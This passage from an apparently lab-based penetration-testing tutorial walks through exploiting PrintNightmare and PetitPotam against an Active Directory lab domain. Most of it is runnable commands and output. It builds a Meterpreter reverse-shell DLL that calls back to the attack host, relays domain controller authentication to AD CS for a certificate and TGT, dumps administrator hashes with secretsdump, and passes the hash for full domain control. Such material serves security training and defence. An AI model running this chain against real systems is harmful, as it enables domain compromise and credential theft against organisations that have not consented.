For this exploit to work successfully, we will need to use cube0x0's  version of Impacket. We may need to uninstall the version of Impacket on our attack host and install cube0x0's (this is already installed on  ATTACK01 in the lab). We can use the commands below to accomplish this:

#### Install cube0x0's Version of Impacket

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

We can use `rpcdump.py` to see if `Print System Asynchronous Protocol` and `Print System Remote Protocol` are exposed on the target.

#### Enumerating for MS-RPRN

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'

Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol 
Protocol: [MS-RPRN]: Print System Remote Protocol 
```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using `msfvenom`.

#### Generating a DLL Payload

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of dll file: 8704 bytes
```

We will then host this payload in an SMB share we create on our attack host using `smbserver.py`.

#### Creating a Share with smbserver.py

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Once the share is created and hosting our payload, we can use MSF to  configure & start a multi handler responsible for catching the  reverse shell that gets executed on the target.

#### Configuring & Starting MSF multi/handler

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080 
```

With the share hosting our payload and our multi handler listening  for a connection, we can attempt to run the exploit against the target.  The command below is how we use the exploit:

#### Running the Exploit

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll
[*] Try 1...
[*] Stage0: 0
[*] Try 2...
[*] Stage0: 0
[*] Try 3...

<SNIP>
```

Notice how at the end of the command, we include the path to the share hosting our payload (`\\<ip address of attack host>\ShareName\nameofpayload.dll`). If all goes well after running the exploit, the target will access the  share and execute the payload. The payload will then call back to our  multi handler giving us an elevated SYSTEM shell.

#### Getting the SYSTEM Shell

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
[*] Sending stage (200262 bytes) to 172.16.5.5
[*] Meterpreter session 1 opened (172.16.5.225:8080 -> 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400

(Meterpreter 1)(C:\Windows\system32) > shell
Process 5912 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```

Once the exploit has been run, we will notice that a Meterpreter  session has been started. We can then drop into a SYSTEM shell and see  that we have NT AUTHORITY\SYSTEM privileges on the target Domain  Controller starting from just a standard domain user account.

------

### PetitPotam (MS-EFSRPC)

PetitPotam ([CVE-2021-36942](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-36942)) is an LSA spoofing vulnerability that was patched in August of 2021.  The flaw allows an unauthenticated attacker to coerce a Domain  Controller to authenticate against another host using NTLM over port 445 via the [Local Security Authority Remote Protocol (LSARPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc) by abusing Microsoft’s [Encrypting File System Remote Protocol (MS-EFSRPC)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/08796ba8-01c8-4872-9221-1000ec2eff31). This technique allows an unauthenticated attacker to take over a Windows domain where [Active Directory Certificate Services (AD CS)](https://docs.microsoft.com/en-us/learn/modules/implement-manage-active-directory-certificate-services/2-explore-fundamentals-of-pki-ad-cs) is in use. In the attack, an authentication request from the targeted  Domain Controller is relayed to the Certificate Authority (CA) host's  Web Enrollment page and makes a Certificate Signing Request (CSR) for a  new digital certificate. This certificate can then be used with a tool  such as `Rubeus` or `gettgtpkinit.py` from [PKINITtools](https://github.com/dirkjanm/PKINITtools) to request a TGT for the Domain Controller, which can then be used to achieve domain compromise via a DCSync attack.

[This](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/) blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

Let's walk through the attack. First off, we need to start `ntlmrelayx.py` in one window on our attack host, specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or  DomainController AD CS template. If we didn't know the location of the  CA, we could use a tool such as [certi](https://github.com/zer1t0/certi) to attempt to locate it.

#### Starting ntlmrelayx.py

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - 

Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
```

In another window, we can run the tool [PetitPotam.py](https://github.com/topotam/PetitPotam). We run this tool with the command `python3 PetitPotam.py <attack host IP> <Domain Controller IP>` to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

There is an executable version of this tool that can be run from a  Windows host. The authentication trigger has also been added to Mimikatz and can be run as follows using the encrypting file system (EFS)  module: `misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>`. There is also a PowerShell implementation of the tool [Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1).

Here we run the tool and attempt to coerce authentication via the [EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8) method.

#### Running PetitPotam.py

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       
                                                                                 
              ___            _        _      _        ___            _                     
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \  
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| 
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""| 
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-' 
                                         
              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)
      
                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN

Trying pipe lsarpc
[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!

[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

#### Catching Base64 Encoded Certificate for DC01

Back in our other window, we will see a successful login request and  obtain the base64 encoded certificate for the Domain Controller if the  attack is successful.

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack RPC loaded..
[+] Protocol Attack SMB loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01$@172.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL
[*] HTTP server returned error code 200, treating as a successful login
[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED
[*] Generating CSR...
[*] CSR generated!
[*] Getting certificate...
[*] GOT CERTIFICATE!
[*] Base64 certificate of user ACADEMY-EA-DC01$: 
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
[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed

<SNIP>
```

#### Requesting a TGT Using gettgtpkinit.py

Next, we can take this base64 certificate and use `gettgtpkinit.py` to request a Ticket-Granting-Ticket (TGT) for the domain controller.

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275
2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

#### Setting the KRB5CCNAME Environment Variable

The TGT requested above was saved down to the `dc01.ccache` file, which we use to set the KRB5CCNAME environment variable, so our  attack host uses this file for Kerberos authentication attempts.

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ export KRB5CCNAME=dc01.ccache
```

#### Using Domain Controller TGT to DCSync

We can then use this TGT with `secretsdump.py` to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
[*] Kerberos keys grabbed
inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6
inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25
inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f
[*] Cleaning up... 
```

We could also use a more straightforward command: `secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL` because the tool will retrieve the username from the ccache file. We can see this by typing `klist` (using the `klist` command requires installation of the [krb5-user](https://packages.ubuntu.com/focal/krb5-user) package on our attack host. This is installed on ATTACK01 in the lab already).

#### Running klist

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ klist

Ticket cache: FILE:dc01.ccache
Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL

Valid starting       Expires              Service principal
04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL
```

#### Confirming Admin Access to the Domain Controller

Finally, we could use the NT hash for the built-in Administrator  account to authenticate to the Domain Controller. From here, we have  complete control over the domain and could look to establish  persistence, search for sensitive data, look for other misconfigurations and vulnerabilities for our report, or begin enumerating trust  relationships.

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)
```

#### Submitting a TGS Request for Ourselves Using getnthash.py

We can also take an alternate route once we have the TGT for our target. Using the tool `getnthash.py` from PKINITtools we could request the NT hash for our target host/user by using Kerberos U2U to submit a TGS request with the [Privileged Attribute Certificate (PAC)](https://stealthbits.com/blog/what-is-the-kerberos-pac/) which contains the NT hash for the target. This can be decrypted with  the AS-REP encryption key we obtained when requesting the TGT earlier.

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[*] Using TGT from cache
[*] Requesting ticket to self with PAC
Recovered NT Hash
313b6f423cd1ee07e91315b4919fb4ba
```

We can then use this hash to perform a DCSync with secretsdump.py using the `-hashes` flag.

#### Using Domain Controller NTLM Hash to DCSync

​                                                                                                        Bleeding Edge Vulnerabilities                      

```shell-session
Kl3gari@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

